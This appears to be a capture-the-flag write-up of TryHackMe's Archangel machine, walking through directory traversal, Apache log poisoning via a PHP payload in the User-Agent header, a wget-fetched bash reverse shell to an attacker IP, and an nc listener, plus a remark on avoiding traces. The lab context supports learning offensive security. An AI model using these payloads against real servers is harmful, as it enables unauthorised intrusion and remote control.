___________________

# Guide LFI (Directory traversal) / Escalation to RCE through log poisoning

First, we need to check if it is vulnerable to Directory Traversal.

![[Captura de pantalla 2026-03-12 171231.png]]

With this done, we are now going to verify if we can exploit the logs and therefore find a Log Poisoning vulnerability.

![[Captura de pantalla 2026-03-12 171431.png]]

We confirm access to the logs:

```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././.././../var/log/apache2/access.log
```

With Log Poisoning confirmed, we are now going to inject information through the logs to confirm this vulnerability. We will send the requests using **curl**.

![[Captura de pantalla 2026-03-12 174109.png]]

We refresh the page and check the logs.

![[Captura de pantalla 2026-03-12 174051.png]]

We see that our requests entered correctly. Keeping this in mind, we are going to open port 80 with Python to send a malicious script that will contain a **SHELL**.

```
#!/bin/bash
bash -i >& /dev/tcp/192.168.201.79/4444 0>&1
```
    VPN IP.

```
curl -s 'http://mafialive.thm' -H "User-Agent: <?php system('wget http://192.168.201.79/pwnd.sh'); ?>"
```
    Request that will attack the User-Agent.

We refresh the page when sending the command.

![[Captura de pantalla 2026-03-12 175718.png]]

The Python connection confirms that the victim machine received it; now we are going to grant execution permissions and execute the script inside the victim machine (waiting with `nc -nlvp 4444` to receive the connection from the victim machine).

![[Captura de pantalla 2026-03-13 001155.png]]

![[Captura de pantalla 2026-03-13 001109.png]]

And we are in; we have successfully executed an **LFI (Directory Traversal) with Log Poisoning**. With this, we only have to escalate privileges.

### Key points

The **Archangel** machine from TryHackMe was developed; for the exploitation of this vulnerability, we focused on `/var/log`.

What exactly is `/var/log`? It is the centralized directory in Linux systems where the kernel, services (such as Apache/Nginx, SSH, MySQL), and applications write their events.

We inject the code through the **User-Agent**, and the reason for this is that through this parameter, we reach exactly the Header.

It is important as pentesters to consider not leaving traces during an attack; using Log Poisoning can be very noisy and leave traces.